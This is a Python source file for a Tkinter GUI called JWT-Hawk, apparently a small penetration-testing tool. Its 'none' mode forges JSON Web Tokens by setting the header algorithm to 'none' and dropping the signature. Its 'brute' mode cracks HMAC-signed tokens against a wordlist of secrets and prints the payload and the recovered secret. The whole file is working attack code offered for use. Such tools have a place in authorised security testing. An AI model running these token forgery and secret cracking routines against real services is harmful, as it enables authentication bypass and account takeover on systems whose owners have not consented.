from __future__ import annotations

"""
GUI front-end for the JWT-Hawk tool.

This application offers the same core features as the CLI script:
1. `none` mode to re-encode a JWT with the header algorithm forced to "none".
2. `brute` mode to attempt decoding a JWT using a list of shared secrets.

Author: RedHawks Cyber Research Tool by DL28
"""

import base64
import json
import tkinter as tk
from pathlib import Path
from tkinter import filedialog, messagebox, ttk

import jwt

AUTHOR = "RedHawks Cyber Research Tool by DL28"

# Align decode options with the CLI version
DECODE_OPTIONS = {
    "verify_signature": True,
    "verify_exp": False,
    "verify_nbf": False,
    "verify_iat": False,
}


def handle_none(jwt_token: str) -> str:
    """Return the token with the header alg forced to 'none'."""
    try:
        header, payload, _signature = jwt_token.split(".")
    except ValueError as err:
        raise ValueError("JWT must contain header, payload, and signature sections.") from err

    try:
        header_json = json.loads(
            base64.urlsafe_b64decode(header + "==").decode("utf-8")
        )
    except (json.JSONDecodeError, UnicodeDecodeError, ValueError) as err:
        raise ValueError("Unable to decode JWT header.") from err

    header_json["alg"] = "none"
    modified_header = (
        base64.urlsafe_b64encode(json.dumps(header_json).encode("utf-8"))
        .decode("utf-8")
        .rstrip("=")
    )
    return f"{modified_header}.{payload}."


def extract_header(jwt_token: str) -> dict:
    """Return the decoded JWT header."""
    try:
        return jwt.get_unverified_header(jwt_token)
    except jwt.InvalidTokenError as err:
        raise ValueError(f"Failed to read JWT header: {err}") from err


def brute_force_decode(jwt_token: str, secrets: list[str]) -> tuple[dict, dict | None, str | None]:
    """Attempt to decode the token with each secret; return header, payload, and matched secret (if any)."""
    if not secrets:
        raise ValueError("Secrets list is empty.")

    header = extract_header(jwt_token)
    algorithms = header.get("alg")
    if isinstance(algorithms, str):
        algorithms = [algorithms]
    elif isinstance(algorithms, (list, tuple)):
        algorithms = list(algorithms)
    else:
        algorithms = []

    hmac_algorithms = [alg for alg in algorithms if isinstance(alg, str) and alg.startswith("HS")]

    if not hmac_algorithms:
        hmac_algorithms = ["HS256", "HS384", "HS512"]

    for secret in secrets:
        try:
            decoded_payload = jwt.decode(
                jwt_token,
                secret,
                algorithms=hmac_algorithms,
                options=DECODE_OPTIONS,
            )
            return header, decoded_payload, secret
        except jwt.InvalidTokenError:
            continue

    return header, None, None


def format_json(data: dict) -> str:
    """Pretty-print dictionary data as JSON."""
    return json.dumps(data, indent=2, sort_keys=True)


class JWTHawkGUI:
    """Main window controller for the GUI."""

    def __init__(self, root: tk.Tk) -> None:
        self.root = root
        self.root.title("JWT-Hawk GUI")
        self.root.geometry("720x560")
        self.root.minsize(640, 480)

        self.mode_var = tk.StringVar(value="none")
        self.token_var = tk.StringVar()
        self.secrets_path_var = tk.StringVar()

        self._build_widgets()

    def _build_widgets(self) -> None:
        """Create and layout the widgets."""
        main_frame = ttk.Frame(self.root, padding="12 12 12 12")
        main_frame.pack(fill=tk.BOTH, expand=True)

        author_label = ttk.Label(main_frame, text=AUTHOR)
        author_label.grid(column=0, row=0, columnspan=3, sticky=tk.W)

        # Mode selection
        mode_label = ttk.Label(main_frame, text="Mode:")
        mode_label.grid(column=0, row=1, sticky=tk.W)

        mode_combo = ttk.Combobox(
            main_frame,
            textvariable=self.mode_var,
            state="readonly",
            values=(
                "none",
                "brute",
            ),
        )
        mode_combo.grid(column=1, row=1, sticky=tk.W)
        mode_combo.bind("<<ComboboxSelected>>", lambda _: self._on_mode_change())

        # Token entry
        token_label = ttk.Label(main_frame, text="JWT Token:")
        token_label.grid(column=0, row=2, sticky=tk.W, pady=(12, 0))

        self.token_entry = ttk.Entry(main_frame, textvariable=self.token_var, width=80)
        self.token_entry.grid(column=0, row=3, columnspan=3, sticky=tk.EW, pady=4)

        # Secrets file selector
        secrets_label = ttk.Label(main_frame, text="Secrets list (for brute mode):")
        secrets_label.grid(column=0, row=4, sticky=tk.W, pady=(12, 0))

        secrets_frame = ttk.Frame(main_frame)
        secrets_frame.grid(column=0, row=5, columnspan=3, sticky=tk.EW, pady=4)

        self.secrets_entry = ttk.Entry(secrets_frame, textvariable=self.secrets_path_var, width=60)
        self.secrets_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)

        browse_button = ttk.Button(secrets_frame, text="Browse…", command=self._select_file)
        browse_button.pack(side=tk.LEFT, padx=(8, 0))

        # Run button
        run_button = ttk.Button(main_frame, text="Run", command=self._run_selected_mode)
        run_button.grid(column=0, row=6, pady=16, sticky=tk.W)

        # Output text area
        output_label = ttk.Label(main_frame, text="Output:")
        output_label.grid(column=0, row=7, sticky=tk.W)

        self.output_text = tk.Text(main_frame, wrap=tk.WORD, height=18)
        self.output_text.grid(column=0, row=8, columnspan=3, sticky=tk.NSEW, pady=4)

        scrollbar = ttk.Scrollbar(main_frame, orient=tk.VERTICAL, command=self.output_text.yview)
        scrollbar.grid(column=3, row=8, sticky=tk.NS)
        self.output_text.configure(yscrollcommand=scrollbar.set)

        # Configure resizing behavior
        main_frame.columnconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=0)
        main_frame.columnconfigure(2, weight=0)
        main_frame.rowconfigure(8, weight=1)

        self._on_mode_change()

    def _select_file(self) -> None:
        """Open a file dialog for the secrets list."""
        file_path = filedialog.askopenfilename(
            title="Select secrets list",
            filetypes=(("Text files", "*.txt"), ("All files", "*.*")),
        )
        if file_path:
            self.secrets_path_var.set(file_path)

    def _on_mode_change(self) -> None:
        """Enable/disable the secrets entry depending on the mode."""
        is_brute = self.mode_var.get() == "brute"
        state = "normal" if is_brute else "disabled"
        self.secrets_entry.configure(state=state)

    def _run_selected_mode(self) -> None:
        """Execute the selected mode and show results."""
        mode = self.mode_var.get()
        jwt_token = self.token_var.get().strip()

        self.output_text.delete("1.0", tk.END)

        if not jwt_token:
            messagebox.showwarning("Input required", "Please provide a JWT token.")
            return

        if mode == "none":
            self._run_none_mode(jwt_token)
        elif mode == "brute":
            self._run_brute_mode(jwt_token)
        else:
            messagebox.showerror("Unsupported mode", f"Mode '{mode}' is not implemented.")

    def _run_none_mode(self, jwt_token: str) -> None:
        """Handle the 'none' mode."""
        try:
            modified_token = handle_none(jwt_token)
        except ValueError as err:
            messagebox.showerror("Error", str(err))
            return

        self._append_output("Modified JWT (alg set to 'none'):\n")
        self._append_output(modified_token + "\n")

    def _run_brute_mode(self, jwt_token: str) -> None:
        """Handle the brute-force mode."""
        secrets_path = self.secrets_path_var.get().strip()
        if not secrets_path:
            messagebox.showwarning("Input required", "Please select a secrets list file.")
            return

        secrets_file = Path(secrets_path)
        if not secrets_file.exists():
            messagebox.showerror("File not found", f"Could not find file: {secrets_path}")
            return

        try:
            with secrets_file.open("r", encoding="utf-8") as handle:
                secrets = [line.strip() for line in handle if line.strip()]
        except OSError as err:
            messagebox.showerror("Error", f"Unable to read secrets file: {err}")
            return

        try:
            header, payload, matched_secret = brute_force_decode(jwt_token, secrets)
        except ValueError as err:
            messagebox.showerror("Error", str(err))
            return

        self._append_output("JWT header:\n")
        self._append_output(format_json(header) + "\n\n")

        if payload:
            self._append_output("JWT payload:\n")
            self._append_output(format_json(payload) + "\n\n")
            self._append_output(f"Matched secret: {matched_secret}\n")
        else:
            self._append_output("No matching secret found in the provided list.\n")

    def _append_output(self, text: str) -> None:
        """Insert text into the output box."""
        self.output_text.insert(tk.END, text)
        self.output_text.see(tk.END)


def main() -> None:
    """Entry point for launching the GUI."""
    root = tk.Tk()
    JWTHawkGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
